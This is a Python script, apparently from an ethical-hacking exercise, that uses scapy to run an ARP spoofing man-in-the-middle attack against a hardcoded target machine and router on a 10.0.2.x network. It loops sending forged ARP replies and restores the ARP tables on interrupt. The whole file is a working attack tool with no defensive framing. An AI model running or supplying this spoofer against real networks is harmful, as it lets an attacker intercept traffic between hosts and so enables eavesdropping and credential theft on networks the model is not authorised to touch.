#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)


def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_req_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

	return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)


target_machine = "10.0.2.15"
target_router = "10.0.2.1"

sent_packets_count = 0
try:
	while True:
		spoof(target_machine, target_router)
		spoof(target_router, target_machine)
		print("\r[+] Packets sent: " + str(sent_packets_count), end="")
		sys.stdout.flush()
		time.sleep(2)
		sent_packets_count = sent_packets_count + 1
except KeyboardInterrupt:
	print("[+] Detected CTRL + C ... Resetting ARP tables... please wait")
	restore(target_machine, target_router)
	restore(target_router, target_machine)
